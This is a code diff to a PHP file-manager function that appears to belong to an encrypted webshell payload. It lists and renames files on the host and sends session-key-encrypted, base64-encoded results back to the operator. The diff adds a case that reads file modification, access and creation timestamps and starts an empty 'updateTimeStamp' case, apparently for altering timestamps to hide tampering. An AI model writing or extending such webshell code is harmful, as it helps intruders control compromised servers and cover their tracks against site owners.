@@ -37,6 +37,7 @@ function main($mode, $path = ".", $content = "", $charset = "",$newpath="")
 	//$path=getgbkStr($path);
 	$path=getSafeStr($path);
     $result = array();
+    $df = "Y-m-d H:i:s";
     if ($path == ".")
         $path = getcwd();
     switch ($mode) {
@@ -56,7 +57,7 @@ function main($mode, $path = ".", $content = "", $charset = "",$newpath="")
                 $obj = array(
                     "name" => base64_encode($fileName),
                     "size" => base64_encode(filesize($fullPath)),
-                    "lastModified" => base64_encode(date("Y-m-d H:i:s", filemtime($fullPath)))
+                    "lastModified" => base64_encode(date($df, filemtime($fullPath)))
                 );
                 $obj["perm"] = is_readable($fullPath) . "," . is_writable($fullPath) . "," . is_executable($fullPath);
                 if (is_file($fullPath)) {
@@ -175,6 +176,21 @@ function main($mode, $path = ".", $content = "", $charset = "",$newpath="")
                 $result["status"] = base64_encode("fail");
                 $result["msg"] = base64_encode($path . "重命名失败");
             }
+            echo encrypt(json_encode($result), $_SESSION['k']);
+            break;
+        case "getTimeStamp":
+            $msg = array();
+            $msg["modifyTimeStamp"] = base64_encode(date($df, filemtime($path)));
+            if (strtoupper(substr(PHP_OS,0,3)) === 'WIN') {
+                $msg["accessTime"] = base64_encode(date($df, fileatime($path)));
+                $msg["creationTime"] = base64_encode(date($df, filectime($path)));
+            }
+            $result["status"] = base64_encode("success");
+            $result["msg"] = base64_encode(json_encode($msg));
+            echo encrypt(json_encode($result), $_SESSION['k']);
+            break;
+        case "updateTimeStamp":
+
             echo encrypt(json_encode($result), $_SESSION['k']);
             break;
         default:
